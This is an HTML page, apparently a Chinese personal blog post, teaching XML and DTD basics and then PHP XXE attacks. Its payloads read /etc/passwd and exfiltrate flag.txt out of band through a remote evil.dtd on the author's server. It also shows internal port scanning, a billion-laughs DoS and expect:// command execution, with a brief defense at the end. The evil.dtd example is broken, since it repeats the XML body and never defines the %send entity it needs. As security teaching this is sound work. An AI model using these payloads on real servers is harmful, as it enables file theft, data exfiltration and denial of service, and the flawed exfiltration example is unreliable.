@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Kage">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Kage">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>K4ge&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <a class="home-link" href=/>K4ge's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+">
+    
+    <!-- 主页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="PHP-XXE"><a href="#PHP-XXE" class="headerlink" title="PHP XXE"></a>PHP XXE</h2><p>@(正式文章)</p>
+<h3 id="xml是什么"><a href="#xml是什么" class="headerlink" title="xml是什么"></a>xml是什么</h3><p>XML指可扩展标记语言<br>用处：被设计用来传输和存储数据。<br>与HTML区别：HTML是被设计用来显示数据，HTML具有特效，XML用来传输数据<br>XML 标签没有被预定义。需要自行定义标签<br>XML 被设计为具有自我描述性</p>
+<h3 id="一个XML文档实例"><a href="#一个XML文档实例" class="headerlink" title="一个XML文档实例"></a>一个XML文档实例</h3><p>第一行是xml声明，定义版本和使用编码<br>第二行是根元素，一个xml文档必须拥有根元素<br>其下几行是子元素<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h3><ol>
+<li>所有XML元素都必须有关闭标签</li>
+<li>XML标签对大小写敏感</li>
+<li>XML必须正确嵌套</li>
+<li>XML文档必须有根元素</li>
+<li>XML的属性值必须加引号</li>
+<li>有些特殊符号需要进行实体引用<br>在XML中的5个预定义实体引用<br><img src="./1543499945581.png" alt="Alt text"></li>
+<li>xml也有注释与html注释一样</li>
+<li>在xml中多个空格是会被保留的</li>
+<li>xml可以有自闭和标签</li>
+</ol>
+<h3 id="XML-DTD学习"><a href="#XML-DTD学习" class="headerlink" title="XML DTD学习"></a>XML DTD学习</h3><p>DTD（文档类型定义）的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。<br>DTD可以被成行地声明于XML文档中，也可作为一个外部引用。</p>
+<h4 id="内部的DOCTYPE声明"><a href="#内部的DOCTYPE声明" class="headerlink" title="内部的DOCTYPE声明"></a>内部的DOCTYPE声明</h4><p>语法声明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure></p>
+<p>带有DTD的XML文档实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
+<p>以上 DTD 解释如下：<br>!DOCTYPE note (第二行)定义此文档是 note 类型的文档。</p>
+<p>!ELEMENT note (第三行)定义 note 元素有四个元素：”to、from、heading,、body”</p>
+<p>!ELEMENT to (第四行)定义 to 元素为 “#PCDATA” 类型</p>
+<h4 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h4><p>假如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="DTD构建模块"><a href="#DTD构建模块" class="headerlink" title="DTD构建模块"></a>DTD构建模块</h4><p>所有的XML文档均有以下简单的构建模块构成：</p>
+<ul>
+<li>元素</li>
+<li>属性</li>
+<li>实体</li>
+<li>PCDATA（实体会被XML解析器所解析）</li>
+<li>CDATA（实体不会被解析）</li>
+</ul>
+<h4 id="DTD属性"><a href="#DTD属性" class="headerlink" title="DTD属性"></a>DTD属性</h4><p>语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="DTD实体（漏洞点）"><a href="#DTD实体（漏洞点）" class="headerlink" title="DTD实体（漏洞点）"></a>DTD实体（漏洞点）</h4><p>实体是用于定义引用普通文本或特殊字符的快捷方式的<strong>变量</strong>。<br>实体引用是对实体的引用。<br>实体可在内部或外部进行声明。</p>
+<p><strong>内部实体语法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>内部实体声明例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;kage&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright bu1uokage.cn&quot;&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>外部实体语法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>外部实体引用例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>外部实体支持的协议<br><img src="./1543746778920.png" alt="Alt text"><br>php扩展协议<br><img src="./1543746812561.png" alt="Alt text"></p>
+<p><strong>参数实体</strong><br>参数实体只能在DTD中使用。<br>语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="PHP的XML解析"><a href="#PHP的XML解析" class="headerlink" title="PHP的XML解析"></a>PHP的XML解析</h3><h4 id="DOM解析"><a href="#DOM解析" class="headerlink" title="DOM解析"></a>DOM解析</h4><ol>
+<li><p>得到面(整个文档)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$xml = new Domdocument(&apos;1.0&apos;,&apos;utf-8&apos;);</span><br><span class="line">$xml-&gt;load(&apos;xxx.xml&apos;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>得到串(节点列表对象,nodelist Object)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$xml-&gt;getElementsByTagName(&apos;节点名&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>得到点(节点/元素)<br>$nodelist-&gt;item(0/1/2….);</p>
+<h4 id="simpleXML解析"><a href="#simpleXML解析" class="headerlink" title="simpleXML解析"></a>simpleXML解析</h4><p>simpleXML解析XML文件非常简单，<br>因为它一次性把XML文档解析成一个大对象。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$simxml = simplexml_load_file(&apos;./book.xml&apos;);</span><br><span class="line">$simxml = simplexml_load_string($xml);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="XXE攻击"><a href="#XXE攻击" class="headerlink" title="XXE攻击"></a>XXE攻击</h3><p>XXE也就是外部实体注入漏洞，通常发生在web服务器在接收解析用户XML输入时，没有对文件内容进行过滤，禁止外部实体加载，导致造成任意文件读取、DOS、命令执行、内网端口扫描等危害。</p>
+<h4 id="有回显的任意文件读取"><a href="#有回显的任意文件读取" class="headerlink" title="有回显的任意文件读取"></a>有回显的任意文件读取</h4><p>用于解析xml的php文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$body = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">$xml = simplexml_load_string($body);</span><br><span class="line">var_dump($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，服务器解析了我们的xml并进行回显<br><img src="./1543743770044.png" alt="Alt text"><br>方法一：直接通过DTD外部实体声明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;file;&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="./1543743949519.png" alt="Alt text"><br>方法二：将DTD放在我们的服务器端，让目标web服务器加载我们的DTD文件<br>xml：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http://www.silky.fun/evil.dtd&quot;&gt;</span><br><span class="line">	%dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;b;&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
+<p>dtd:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="无回显的任意文件读取"><a href="#无回显的任意文件读取" class="headerlink" title="无回显的任意文件读取"></a>无回显的任意文件读取</h4><p>无回显的任意文件读取需要我们自己构造一条外带OOB通道，具体就是，让目标服务器将文件内容赋值到参数实体中，再通过外部实体发送GET请求给我们的vps，我们写脚本或者通过vps日志文件就能获取信息。<br>xml内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;flag.txt&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http://www.silky.fun/evil.dtd&quot;&gt;</span><br><span class="line">	%dtd;</span><br><span class="line">	%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
+<p>evil.dtd内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.txt&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http://www.silky.fun/evil.dtd&quot;&gt;</span><br><span class="line">	%dtd;</span><br><span class="line">	%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发送<br><img src="./1543745180681.png" alt="Alt text"><br>从access.log查看回显<br><img src="./1543745021636.png" alt="Alt text"></p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ENTITY port SYSTEM &quot;http://127.0.0.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;port;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+<p>我们知道80端口是开放的，这时页面会返回报错信息如下：<br><img src="./1543745894729.png" alt="Alt text"><br>检测3389端口是没开放的，报错如下：<br><img src="./1543745945842.png" alt="Alt text"></p>
+<h4 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;!DOCTYPE lolz [</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> ]&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>xml命令执行需要php有expect扩展，但是默认没有，比较难利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;xxe;&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
+<h3 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h3><p>刚开始测试的时候，我用的是php5.6一直不能引用外部实体，后来发现php5.5以下的才能够成功。网上很多文章都没有提到，很多直接介绍xml和xxe，所以复现起来老是失败，后来在网上找到一个回答可以参考一下</p>
+<blockquote>
+<p>以上测试在php5.4一下包括5.4是成功的，php5.5及以上是不成功的。可能的原因是5.5以上版本后，simplexml_load_string()、DOMDocument::loadxml()等不解析外部实体导致都不到文件还是因为libxml2版本的问题，还是高版本的php本身默认不解析外部实体呢，还是其他神恶魔原因呢？如果是因为php本身问题，那么XXE的利用范围也太过小了吧，应该不是这样的。。但是讲道理网上的资料太老了吧，估计也是参考别人的自己没有试验吧，等有空再做实验看看是什么问题。<br>今天在弄phith0n的vulhub的时候，无意间看到php-xxe的项目，得到了我想要的结果。XXE的利用跟php版本没有关系，而是xmllib的版本问题，xmllib2.9.0以后，是默认不解析外部实体的。</p>
+</blockquote>
+<p>还有一个坑就是，无回显直接传输内容可能会失败，用php流传输比较好。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Kage</a>
+            <p>原文链接：<a href="http://yoursite.com/others/PHP/PHP XXE.html">http://yoursite.com/others/PHP/PHP XXE.html</a>
+            <p>发表日期：<a href="http://yoursite.com/others/PHP/PHP XXE.html">July 20th 2019, 8:57:07 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/others/PHP/PHP XXE.html">July 20th 2019, 8:57:07 pm</a>
